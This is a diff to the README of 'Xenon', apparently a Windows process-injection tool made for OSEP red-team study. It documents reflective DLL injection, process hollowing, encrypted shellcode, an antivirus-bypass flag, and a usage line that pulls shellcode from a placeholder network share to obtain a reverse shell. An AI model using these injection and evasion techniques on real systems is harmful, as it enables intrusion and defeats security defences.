@@ -7,6 +7,8 @@ Complete Arsenal of Memory injection and other techniques for red-teaming in Win
 
 - Reflective DLL Injection for DLL injection. It downloads the DLL and injects into remote process.
 - Process hollowing via svchosts.exe
+- With -bypass flag it tends to use more advanced un-documented API for process injeciton and the routine itself gets changes.
+- Now even supports encrypted shellcode. 
 
 ```
 C:\Users\admin>Injector.exe
@@ -18,9 +20,26 @@ Help Options for Xenon:
 
 -shellcode       Use shellcode
 -dll     Use dll
+
+-encrypt-xor   Specify Xor encryption for shellcode
+         -pass   Specifty the password for Xor encryption
+-encrypt-aes   Specify Xor encryption for shellcode
+         -pass   Specifty the password for aes encryption
 -location        Specify the location i.e either server or local
+-bypass         Uses enhance attempts to bypass AV
 ```
+
+To generate encrypted shellcode, use Helper.exe on kali along with proper switch.
+
+### Example of usage
+
+```
+Injector.exe -m=1 -shellcode -encrypt-aes -pass=password -location="\\192.x.x.x\share\shellcode.txt" -bypass
+```
+This is will decrypt your shellcode and give you reverse shell
 
 # Why make it?
 
 Main aim is to help me in OSEP :P
+
+**NOTE: Work in Progress. Some functionality might be broken!**
